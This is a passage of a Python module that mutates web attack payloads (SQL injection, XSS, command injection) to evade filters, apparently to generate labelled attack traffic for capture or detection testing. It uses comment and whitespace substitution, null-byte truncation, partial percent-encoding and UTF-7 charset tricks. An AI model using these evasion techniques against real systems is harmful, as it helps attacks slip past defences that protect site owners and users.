    # Inline SQL comments in place of spaces (harmless-looking elsewhere).
    return p.replace(" ", "/**/")


_WS_SUBSTITUTES = ["\t", "\n", "\x0b", "\x0c", "%0a", "%09"]


def _mutate_ws(p: str) -> str:
    # Swap spaces for an alternate whitespace/control token - defeats
    # filters that only strip literal spaces (or only tabs).
    return p.replace(" ", random.choice(_WS_SUBSTITUTES))


def _mutate_nullbyte(p: str) -> str:
    # Literal "%00" as DATA (not an actual NUL byte) - classic truncation
    # bypass: some parsers/filters stop reading at the null byte while the
    # backend keeps parsing past it. Appended, or spliced mid-payload.
    if len(p) <= 1 or random.random() < 0.5:
        return p + "%00"
    i = random.randrange(1, len(p))
    return p[:i] + "%00" + p[i:]


def _encode_partial(p: str) -> str:
    # Encode only a RANDOM SUBSET of special characters, leaving the rest
    # (often including the keyword tokens themselves) in plaintext - defeats
    # filters that only pattern-match the fully-decoded OR fully-encoded
    # form, since this payload is neither.
    out = []
    for c in p:
        if not c.isalnum() and random.random() < 0.5:
            out.append(f"%{ord(c):02X}")
        else:
            out.append(c)
    return "".join(out)


def _utf7_char(c: str) -> str:
    b64 = base64.b64encode(c.encode("utf-16-be")).decode("ascii").rstrip("=")
    return f"+{b64}-"


_UTF7_TARGET_CHARS = set("<>&'\"();:=/")


def _encode_utf7(p: str) -> str:
    # Classic charset-confusion XSS bypass: force the HTML-breakout
    # characters into UTF-7 shifted sequences (e.g. '<' -> '+ADw-') while
    # leaving alphanumerics as direct characters. Only meaningful where a
    # downstream parser can be coaxed into interpreting the response as
    # UTF-7 - included as an XSS-only evasion for that reason.
    return "".join(_utf7_char(c) if c in _UTF7_TARGET_CHARS else c for c in p)


def apply_evasion(payload_id: str, raw_payload: str, evasion: str,
                  attack_type: str, rng=random):
    """Return (variant_type, parent_id, transformed_payload).

    variant_type == 'original' means no transform was applied. parent_id links
    a variant back to its base payload_id (emitted as X-Capture-Parent).
    """
    if evasion == "encoded":
        # A payload that already contains a literal '%' (e.g. the %0a/%0d
        # newline-separator command_injection payloads - see gen_chain_74-78)
        # is already its own encoding technique. Re-running it through
        # _encode_url/_encode_double/_encode_partial percent-encodes the '%'
        # itself (%0a -> %250a), which a single server-side URL-decode does
        # NOT undo back to a real separator - found 2026-09-17, affected 206
        # captured command_injection records. Skip percent-based re-encoding
        # for those; they're left as-is (already an evasion form) unless the
        # xss-only UTF-7 path applies, which doesn't touch '%' at all.
        if "%" in raw_payload and attack_type != "xss":
            return "encoded", payload_id, raw_payload
        choices = [_encode_url, _encode_double, _encode_partial]
        if attack_type == "xss":
            choices.append(_encode_utf7)
        if "%" in raw_payload:
            choices = [_encode_utf7]
        fn = rng.choice(choices)
        return "encoded", payload_id, fn(raw_payload)
    if evasion == "mutated":
        fn = rng.choice([_mutate_case, _mutate_comment, _mutate_ws, _mutate_nullbyte])
        return "mutated", payload_id, fn(raw_payload)
    if evasion == "polyglot":
        bank = POLYGLOTS[attack_type]
        idx = rng.randrange(len(bank))
        return "polyglot", f"{attack_type}-polyglot-{idx}", bank[idx]
    return "original", payload_id, raw_payload


if __name__ == "__main__":
    for at in BANKS:
        n = sum(len(v) for v in BANKS[at].values())
        reach = {g: len(base_payloads(at, g)) for g in ("recon", "exploit", "exfiltration")}
        print(f"{at:16s} base_total={n:5d} polyglots={len(POLYGLOTS[at]):3d} "
              f"| reachable: recon={reach['recon']:4d} "
              f"exploit={reach['exploit']:5d} exfil={reach['exfiltration']:5d}")
